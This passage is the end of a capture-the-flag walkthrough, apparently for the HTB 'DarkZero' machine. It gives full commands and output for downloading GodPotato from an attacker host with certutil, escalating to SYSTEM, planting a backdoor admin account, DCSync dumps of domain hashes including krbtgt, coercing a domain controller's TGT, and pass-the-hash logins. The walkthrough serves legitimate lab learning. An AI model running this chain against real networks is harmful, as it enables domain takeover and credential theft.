The first two attempts fail for different reasons: `CreateProcessWithLogonW` simply doesn't support Type 5, so it silently fell back to Type 2 (Interactive), which `svc_sql` isn't granted at all. The `-f 1` attempt (`CreateProcessWithTokenW`) failed with `WSAConnect` because the reverse connection couldn't be established at that moment. The combination of `powershell -l 5 -b` on the third try finally produces a full token, and there it is, `SeImpersonatePrivilege: Enabled`. When one logon type or tool flag fails, I don't give up, I try a different combination, because the goal the whole time is a token carrying `SeImpersonatePrivilege`. Once I see it, I know I'm ready for a Potato attack.

### 5.3 GodPotato → SYSTEM

**Upload:**
```cmd
certutil -urlcache -f http://10.10.15.7:8000/GodPotato.exe C:\Windows\Temp\GodPotato.exe
```

**Test:**
```cmd
C:\Windows\Temp\GodPotato.exe -cmd "cmd /c whoami"
```

**Full Result:**
```
[*] CombaseModule: 0x140736389775360
[*] DispatchTable: 0x140736392362312
[*] UseProtseqFunction: 0x140736391657648
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\ed8822d7-a6e6-4a50-82af-62151e730bdc\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00002802-0274-ffff-de41-1fbdc0b34d52
[*] DCOM obj OXID: 0x7790e2e7b427e44e
[*] DCOM obj OID: 0x46069f3e4916088d
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1004 Token:0x720  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3620
```

**Create Persistent Admin:**
```cmd
C:\Windows\Temp\GodPotato.exe -cmd "cmd /c net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add"
```

**Full Result:**
```
[*] CombaseModule: 0x140736389775360
[*] DispatchTable: 0x140736392362312
[*] UseProtseqFunction: 0x140736391657648
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\cb33fa67-7f59-4eaa-bc94-a4243f7368c8\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00002802-068c-ffff-3e0a-f2237aa0e745
[*] DCOM obj OXID: 0xe08ed6d65273a4e4
[*] DCOM obj OID: 0x11c0dca739c1e8b0
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1004 Token:0x720  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1536
The command completed successfully.

The command completed successfully.
```

GodPotato abuses `SeImpersonatePrivilege` by coercing a SYSTEM-level service, via DCOM/RPC, into authenticating to a named pipe the exploit controls, then impersonating that SYSTEM token to run whatever command I give it. This isn't a bug being exploited, it's a privilege the account legitimately has being abused for more than it was meant for.

GodPotato is a one-shot primitive, though, each command re-triggers the whole exploit chain, so rather than relying on that every time, I immediately use it once to create a persistent local admin account. That way I can reconnect anytime with something like `wmiexec` without needing to re-run GodPotato at all. Once `SeImpersonatePrivilege` is in hand, escalating to SYSTEM is straightforward, and creating a persistent admin account right away saves a lot of time later.

### 5.4 DCSync `darkzero.ext`

**Command:**
```bash
impacket-secretsdump -just-dc darkzero.ext/hacker:'P@ssw0rd123!'@172.16.20.2
```

**Full Result:**
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:309b86b60a8fb9f0eaa7b695d983e9a8:::
hacker:1106:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:0ae2342c8164dc64399859a0f8fdaeec:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:3a9616ace37521e8a05bcaf6c68e3bbf44adfc7aa997b6123b7da6e39f7d0b3c
Administrator:aes128-cts-hmac-sha1-96:5da4b74154944739351c6da76d657a7d
Administrator:des-cbc-md5:ad1c6ec1df64a1e0
krbtgt:aes256-cts-hmac-sha1-96:e1b65b38be61373cad5930ace5bb65161460324e0c42c0ea14a73e4ac2314f4c
krbtgt:aes128-cts-hmac-sha1-96:133d768fd3a1214bba00fec89d2e56c1
krbtgt:des-cbc-md5:d04f0b3d3b385b31
svc_sql:aes256-cts-hmac-sha1-96:2357671183ea75b3ecc887e3bc4bba98775311ba758a3e5505e10be08be2385c
svc_sql:aes128-cts-hmac-sha1-96:9da116aebd37167ff2d2acc769d480fe
svc_sql:des-cbc-md5:ba4fa80186f14c64
hacker:aes256-cts-hmac-sha1-96:3b97dd0723d042631f70387fb92d4ca5bee5fa1b22baa6047688621ad9fb3764
hacker:aes128-cts-hmac-sha1-96:a28eccfa85207165874c162c15bf7cab
hacker:des-cbc-md5:02f1917c29c16404
DC02$:aes256-cts-hmac-sha1-96:fd92bfbfbc948bef1d1a04f7c342ca606b0eb72023a421b05a80561fbf3b28e2
DC02$:aes128-cts-hmac-sha1-96:1bd1d05e0abf42edc09e0c0064c010d3
DC02$:des-cbc-md5:bf926ea2ce765d46
darkzero$:aes256-cts-hmac-sha1-96:6d6d1f9c3ec09539835311dfa7763db4694a1d08259518b717787fe31eec193c
darkzero$:aes128-cts-hmac-sha1-96:98dda02ff485d5df89756124e1ea688e
darkzero$:des-cbc-md5:29aebf91299d7f7c
[*] Cleaning up... 
```

A local administrator on a Domain Controller already has the replication rights DCSync needs, `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, so I don't need Domain Admin specifically, local admin on a DC is enough. With `hacker`'s credentials in hand from the GodPotato step, this pulls every credential in `darkzero.ext`, including the Administrator hash and the krbtgt hash. That last one in particular is huge, since it means full, standing control of this domain, including the ability to forge golden tickets if I needed to. Local admin on a DC effectively equals DCSync, because the DC's own machine context carries replication rights, worth checking for immediately any time local admin is achieved on a DC.

---

## Phase 6: Cross-Domain TGT Capture, Compromising `darkzero.htb`

### 6.1 The Unconstrained Delegation Concept

`darkzero.ext` is fully compromised now, but the original engagement also includes `darkzero.htb`, and I haven't touched DC01 yet beyond the initial MSSQL foothold. This is where the trust from Phase 1 comes back into play.

DC02 has **Unconstrained Delegation** enabled, which means any authentication sent to it gets its TGT cached straight into DC02's LSASS memory. DC01 is the Domain Controller for `darkzero.htb`, and its machine account, `DC01$`, carries replication rights on its own domain, so if I can capture `DC01$`'s TGT, I can DCSync `darkzero.htb` the exact same way I just did for `darkzero.ext`.

The reason this works across the forest boundary at all is the trust itself: the bidirectional trust between `darkzero.htb` and `darkzero.ext` has TGT Delegation enabled (`CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`), meaning a TGT from one forest can be forwarded into the other.

So the plan is: force DC01 to authenticate to DC02, let unconstrained delegation cache DC01$'s TGT on DC02, capture that TGT with Rubeus, then use it to DCSync `darkzero.htb`.

### 6.2 Starting Rubeus Monitor

**Upload Rubeus:**
```cmd
lput /home/hyena/Downloads/.../Rubeus.exe C:\Windows\Temp
```

**Start Monitor:**
```cmd
C:\Windows\Temp\Rubeus.exe monitor /interval:5 /nowrap
```

Rubeus watches LSASS for new TGTs showing up. `/interval:5` checks every five seconds, and `/nowrap` prints each ticket on one line so it's easy to copy out. This has to be running before I trigger anything, the TGT only gets cached in LSASS the moment the authentication actually happens. If Rubeus isn't watching when that occurs, the ticket is technically still there (`triage` could still find it after the fact), but `monitor` won't catch and announce it live.

### 6.3 Forcing DC01 to Authenticate, `xp_dirtree` with `C$`

The share name turns out to matter a lot here. I first tried `\\DC02.darkzero.ext\notexists`, `\anything`, and `\freshcoerce`, all of them returned empty results, but no TGT ever appeared in the Rubeus monitor.

**Working command (from MSSQL on DC01, local, no `AT` clause):**
```sql
xp_dirtree \\DC02.darkzero.ext\C$
```

`C$` is an administrative share, and accessing it specifically forces the authentication to use the machine account, `DC01$`, because administrative shares require machine-level authentication to reach them. Non-existent shares seem to fail before the machine-account TGT ever gets requested, or they authenticate as the SQL service account instead, either way, they don't produce what I need. `C$` does.

**Rubeus Result (within ~5 seconds):**
```
[*] Found new TGT:
  User      : DC01$@DARKZERO.HTB
  Flags     : name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket: doIFjDCCBYig...
```

The `forwarded` flag is the proof this worked the way I intended, it means this TGT actually crossed the forest boundary via the unconstrained delegation trust, not just a local authentication.

### 6.4 Using the TGT, DCSync `darkzero.htb`

**On Kali:**
```bash
# Save the Base64 ticket
echo 'doIFjDCCBYig...' | base64 -d > dc01.kirbi
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache

# DCSync
impacket-secretsdump -just-dc-user Administrator -k dc01.darkzero.htb
```

**Full Result:**
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
[*] Kerberos keys grabbed
Administrator:0x14:298bc77657a3737b452bb09be407d46b795774e5c3bbfcc68e8f0a4015b59459
Administrator:0x13:d1d84cca796daa8d9dda56c9fbd29110
Administrator:aes256-cts-hmac-sha1-96:fe0ba028010ee4f408ebc846d3f480c1880a4f0274acdb226d3afcdc3595dc21
Administrator:aes128-cts-hmac-sha1-96:a2a7e0e9a4b5ade57242b3e97756dca3
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
[*] Cleaning up... 
```

`DC01$` is the machine account of the `darkzero.htb` Domain Controller, and it holds `DS-Replication-Get-Changes` rights on its own domain, so impersonating it through its captured TGT lets me DCSync just like I did with the local admin account on DC02, except this time against a domain I never had a foothold on directly. Without unconstrained delegation and TGT delegation configured correctly on the trust, `DC01$`'s TGT would never have been cached on DC02 in the first place, so the `forwarded` flag is really the whole story here. Unconstrained delegation is a TGT trap: coerce a privileged machine, capture its TGT, impersonate it, one of the most powerful cross-domain moves in AD, and it's exactly how `darkzero.htb` falls after `darkzero.ext` is already owned.

### 6.5 Getting the Flags

**Root Flag (DC01):**
```bash
evil-winrm -i dc01.darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

**Full Result:**
```
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
58f7c749c77bd63c83c976c51c6358e9
```

**User Flag (DC02):**
```cmd
type C:\Users\Administrator\Desktop\user.txt
```

**Full Result:**
```
e93c708ebfa41aa4f7a73c8b1e4cf6c0
```

---

## Complete Attack Chain

```
john.w (initial credential) → MSSQL on DC01
        ↓
Linked server to DC02.darkzero.ext → sysadmin on DC02 (cross-forest MSSQL trust)
        ↓
xp_cmdshell enabled → OS command execution as svc_sql (network logon, Type 3, no SeImpersonate)
        ↓
Reverse shell on DC02
        ↓
tasklist finds AD CS (certsrv.exe) → Certify requests "User" template cert for svc_sql
        ↓
certipy PKINIT auth → UnPAC-the-Hash → svc_sql NTLM hash
        ↓
impacket-changepasswd using the hash → known plaintext for svc_sql
        ↓
RunasCs Logon Type 5 → full token with SeImpersonatePrivilege
        ↓
GodPotato → NT AUTHORITY\SYSTEM on DC02 → persistent local admin "hacker"
        ↓
Local admin on DC02 → DCSync darkzero.ext (Administrator + krbtgt hashes)
        ↓
DC02 has Unconstrained Delegation → xp_dirtree \\DC02\C$ from DC01 coerces DC01$ auth
        ↓
Rubeus captures DC01$'s forwarded TGT
        ↓
DCSync darkzero.htb using DC01$'s TGT → Administrator hash
        ↓
evil-winrm as Administrator on DC01 → root flag
```

---

## Key Concepts Learned

| Concept | Why It Matters |
|---|---|
| **MSSQL Linked Server Mapping** | A trust bridge between SQL instances. If the remote login is privileged, the local login inherits that privilege. |
| **`xp_cmdshell`** | Converts SQL `sysadmin` into direct OS command execution as the SQL service account. |
| **Restricted vs Full Token** | `xp_cmdshell` hands out a restricted (Type 3) token with no `SeImpersonate`. A Service Logon (Type 5) gives a full token instead. |
| **AD CS + UnPAC-the-Hash** | A certificate for your own account, even from a non-privileged template, can recover your NTLM hash without ever knowing the password. |
| **`SeImpersonatePrivilege` + Potato** | The standard Windows path from service-account context to SYSTEM once that privilege is present. |
| **Unconstrained Delegation** | Any TGT sent to a machine configured this way gets cached in its LSASS. Coerce a privileged machine to authenticate, then capture and reuse its TGT. |
| **Cross-Forest TGT Delegation** | The trust attribute `CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION` is what lets a TGT be forwarded across a forest boundary at all. |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service identification |
| `netexec` / `nxc` | Credential validation, SMB enumeration |
| `bloodhound-python` | AD relationship mapping (trusts, ACLs) |
| `impacket-mssqlclient` | MSSQL access and linked server enumeration |
| `Certify.exe` | AD CS certificate enumeration and request |
| `certipy-ad` | PKINIT authentication and hash extraction |
| `impacket-changepasswd` | Password reset using an NTLM hash |
| `RunasCs.exe` | Creating a Service Logon (Type 5) session |
| `GodPotato.exe` | `SeImpersonatePrivilege` → SYSTEM |
| `Rubeus.exe` | TGT monitoring and capture |
| `impacket-secretsdump` | DCSync |
| `Ligolo-ng` | Network tunnel to reach the internal `172.16.20.0/24` segment |
| `evil-winrm` | WinRM shell access as Domain Admin |

---

## Final Flags

**User Flag:** `e93c708ebfa41aa4f7a73c8b1e4cf6c0`
**Root Flag:** `58f7c749c77bd63c83c976c51c6358e9`

---

This writeup documents every step of the DarkZero attack chain, from the initial low-privileged credential through to full compromise of both forests, with the reasoning behind each move explained as I went. The certificate blob has been redacted for brevity; everything else is included in full.
